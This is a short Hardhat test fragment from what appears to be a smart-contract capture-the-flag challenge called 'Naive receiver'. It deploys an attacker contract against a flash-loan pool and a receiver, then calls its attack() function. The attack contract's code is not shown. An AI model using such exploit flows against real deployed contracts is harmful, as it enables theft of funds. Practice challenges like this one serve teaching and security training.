...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Exploit", async function () {
    const NavieAttack = await ethers.getContractFactory("NavieAttack");
    this.navieAttack = await NavieAttack.connect(attacker).deploy(
      this.pool.address,
      this.receiver.address
    );

    await this.navieAttack.connect(attacker).attack();
  });
